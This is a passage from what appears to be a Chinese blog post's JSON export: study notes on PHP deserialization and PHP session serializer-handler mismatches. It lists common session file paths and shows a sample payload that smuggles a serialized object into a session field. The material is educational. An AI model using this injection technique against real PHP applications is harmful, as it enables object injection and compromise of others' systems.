class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行结果如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">__wakeup:wakeup\n__toString:tosTRING\n__destruct:tosTRING\n__destruct:demo<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里首先在反序列化是调用<code>__wakeup()</code>，然后在输出时调用了<code>__toString()</code>方法，最后在结束时调用了两次<code>__destruct()</code>方法，这是因为有两个对象被销毁了，分别是<code>$a</code>和<code>%c</code></p>\n<p>反序列化后的对象在经过PHP的字符串函数时，都会触发<code>__toString()</code>方法，例如遇到strlen(), addslashes(), class_exists()等函数时</p>\n<h2 id=\"PHP-Session序列化和反序列化\"><a href=\"#PHP-Session序列化和反序列化\" class=\"headerlink\" title=\"PHP_Session序列化和反序列化\"></a>PHP_Session序列化和反序列化</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器来访问用户session，并且把session序列化存储到指定目录下，一般为/tmp</p></blockquote>\n<p>常见的PHP_Session的存储位置：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID\n&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID\n\n&#x2F;var&#x2F;lib&#x2F;php5&#x2F;sess_PHPSESSID\n&#x2F;var&#x2F;lib&#x2F;php5&#x2F;sessions&#x2F;sess_PHPSESSID\n\n&#x2F;tmp&#x2F;sess_PHPSESSID\n&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里借用一张图片来说明。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004112300.png\" alt=\"PHPsession处理器\"></p>\n<p>session相关配置项（这里实在php.ini文件中）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">session.save_path&#x3D;&quot;&quot;   --设置session的存储路径,默认在&#x2F;tmp\nsession.auto_start   --指定会话模块是否在请求开始时启动一个会话,默认为0不启动\nsession.serialize_handler   --定义用来序列化&#x2F;反序列化的处理器名字。默认使用php\nsession.save_handler&#x3D;&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)，比如files就是session默认以文件的方式进行存储<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在PHP中默认使用的是PHP引擎，如果要还用其他引擎，就需要添加代码一行代码来实现</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php_serialize'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//what you want to do </span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>session存储文件是以sess_sessionid来统一命名的，文件的内容就是session的序列化后内容，例如sess_1ja9n90ssk985tff4r0b2sojd6</p>\n<p>PHPsession出现危害主要是程序员的处理不当，例如前面说了默认使用PHP引擎来进行序列化，但是可以使用ini_set()函数来指定自己要使用的引擎，这里就会出现一个问题了，如果反序列化$_SESSION数据时使用的处理器引擎和序列化时使用的不同，就会出现无法正常反序列化的问题。从而可以利用特殊构造来伪造任意数据。常见的比如存入session时使用的处理器为php_serialize,而反序列化使用的是php处理器。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'alan'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'|O:8:\"stdClass\":0:&#123;&#125;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//这里的session数据，在存储时使用的序列化处理器是php_serialize</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php_serialize'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>a:1:&#123;s:4:&quot;alan&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</code></p>\n<p>现在用php处理器去反序列化看看会如何？</p>\n<p>如果反序列化处理器不是php_serialize，而是php的话，那么反序列化后的数据就会变成一个数组，得到一个新的对象。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>当配置选项session.auto_start=On，会自动注册Session会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，<br>因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话，然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，<br>这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题,因为 PHP 自动注册 Session 会话是在脚本执行前，所以通过该方式只能注入 PHP 的内置类。</p>\n<p>当配置选项 session.auto_start＝Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题</p></blockquote>\n<h2 id=\"参考材料\"><a href=\"#参考材料\" class=\"headerlink\" title=\"参考材料\"></a>参考材料</h2><p>[1]. <a href=\"https://www.cnblogs.com/tr1ple/p/11156279.html\">https://www.cnblogs.com/tr1ple/p/11156279.html</a></p>\n<p>[2].<a href=\"https://www.cnblogs.com/ichunqiu/p/10484832.html\">https://www.cnblogs.com/ichunqiu/p/10484832.html</a></p>\n","text":"序列化与反序列化序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。这个过程就像把数据封装成某种可逆的特殊结构，然后在另一台...","link":"","photos":[],"count_time":{"symbolsCount":"7.1k","symbolsTime":"6 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":34,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":1,"path":"api/tags/反序列化.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">序列化与反序列化</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">PHP反序列化中常见的PHP魔术方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#void-wakeup-void\"><span class=\"toc-text\">void __wakeup(void)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#void-construct-mixed-args-%E2%80%A6\"><span class=\"toc-text\">void __construct([ mixed $args [,$…]])</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#void-destruct-void\"><span class=\"toc-text\">void __destruct(void)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#public-string-toString-void\"><span class=\"toc-text\">public string __toString(void)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#sleep\"><span class=\"toc-text\">__sleep()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#call\"><span class=\"toc-text\">__call()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#get\"><span class=\"toc-text\">__get()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#isset\"><span class=\"toc-text\">__isset()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#unset\"><span class=\"toc-text\">__unset()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#invoke\"><span class=\"toc-text\">__invoke()</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0\"><span class=\"toc-text\">PHP反序列化漏洞成因</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CPOP%E9%93%BE\"><span class=\"toc-text\">PHP反序列化和POP链</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Autoloading\"><span class=\"toc-text\">Autoloading</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Composer%E4%B8%8EAutoloading\"><span class=\"toc-text\">Composer与Autoloading</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AF%BB%E6%89%BE%E4%BE%9D%E8%B5%96%E5%BA%93%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">寻找依赖库漏洞</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%8B%E9%9D%A2%E5%B0%B1%E4%BB%A5-wakeup-%E7%BB%95%E8%BF%87%E6%9D%A5%E4%B8%8A%E4%B8%AA%E5%AE%9E%E4%BE%8B\"><span class=\"toc-text\">下面就以__wakeup()绕过来上个实例</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#toString-%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">__toString()方法利用</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP-Session%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">PHP_Session序列化和反序列化</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%9D%90%E6%96%99\"><span class=\"toc-text\">参考材料</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUUOJ刷题小记","uid":"fbef6aca98c892cb1e786b7509bd311a","slug":"BUUOJ刷题小记","date":"2020-10-03T06:03:06.000Z","updated":"2021-06-28T14:59:58.000Z","comments":true,"path":"api/articles/BUUOJ刷题小记.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"0x01 De1CTF SSRF Me考察代码审计 看名字感觉是SSRF的题目，但是打开发现更像是一题代码审计，给了一个flask框架的代码，有点长先做一下美化，在开始看。 #! /usr/bin/env python #encoding=utf-8 from flask imp...","link":"","photos":[],"count_time":{"symbolsCount":"7k","symbolsTime":"6 mins."},"categories":[{"name":"CTF","slug":"CTF","count":43,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"},{"name":"De1CTF 2019","slug":"De1CTF-2019","count":1,"path":"api/tags/De1CTF-2019.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"2020黑盾杯题目记录","uid":"fac16ea8923bbbe8935929d55bdc28af","slug":"2020黑盾杯题目记录","date":"2020-09-30T04:20:07.000Z","updated":"2020-09-30T12:03:52.000Z","comments":true,"path":"api/articles/2020黑盾杯题目记录.json","keywords":"A1andNS","cover":[],"text":"记录一下黑盾杯2020，和某比赛题目撞了． Misc-Blue 利用查找功能找到每一轮的开头33，查看上一条查询语句就知道上一个字母是什么，然后手动拼凑成flag flag&#123;Gre4t_j0B_ON_This_Blue_sh4rk&#125; Misc-Encrypto...","link":"","photos":[],"count_time":{"symbolsCount":"9.4k","symbolsTime":"9 mins."},"categories":[{"name":"CTF","slug":"CTF","count":43,"path":"api/categories/CTF.json"}],"tags":[{"name":"黑盾杯","slug":"黑盾杯","count":1,"path":"api/tags/黑盾杯.json"},{"name":"MISC","slug":"MISC","count":1,"path":"api/tags/MISC.json"},{"name":"CTF","slug":"CTF","count":15,"path":"api/tags/CTF.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}